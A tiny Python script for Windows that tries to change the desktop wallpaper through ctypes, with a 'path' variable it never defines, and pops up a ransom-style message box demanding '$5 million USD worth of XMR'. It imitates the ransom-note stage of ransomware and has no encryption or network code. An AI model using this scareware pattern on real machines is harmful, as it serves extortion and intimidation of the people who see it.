#!/usr/bin/python3

import ctypes

ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

MessageBox = ctypes.windll.user32.MessageBoxW
res = MessageBox(None, 'Transfer $5 million USD worth of XMR or your data will be compromised', 'All Your Base Are Belong To Us', 0)
print(res)

